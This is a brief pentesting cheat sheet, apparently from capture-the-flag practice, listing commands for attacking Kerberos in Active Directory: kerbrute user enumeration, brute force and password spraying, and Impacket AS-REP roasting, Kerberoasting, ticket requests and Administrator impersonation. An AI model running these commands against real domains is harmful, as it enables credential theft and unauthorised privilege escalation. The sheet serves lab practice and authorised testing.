# Kerberos


## Sync time with the server 

    sudo ntpdate -d TARGET_IP
    sudo ntpdate FOREST.htb.local

## User enum

    kerbrute userenum -d Domain --dc TARGET_IP /usr/share/seclists/Usernames/cirt-default-usernames.txt


## Brute user

    kerbrute bruteuser -d Domain --dc TARGET_IP /usr/share/seclists/Passwords/darkweb2017-top1000.txt plop

## Password spraying 

    kerbrute passwordspray -d Domain --dc TARGET_IP username.lst Password123


## Impacket

### KRB_AS_REP Roasting

    GetNPUsers.py  Domain/ -usersfile userKerb -no-pass


### Kerberoasting



    GetUserSPNs.py -dc-ip TARGET_IP 'Domain/Username:PASSWORD'  -request   

    getST.py -dc-ip TARGET_IP -spn cifs/HOST.Domain 'Domain/Username:PASSWORD' 

### Requesting tickets

    getTGT.py 'Domain/Username:PASSWORD'  

> Using tickets

    export KRB5CCNAME=Username.ccache 

    klist

    smbclient.py Username@HOST.Domain -k -no-pass

### Impersonation tickets

    getST.py -dc-ip TARGET_IP -spn cifs/HOST.Domain 'Domain/Username:PASSWORD -impersonate Administrator

### lookupsid


    lookupsid.py Domain/Username:PASSWORD@Target_IP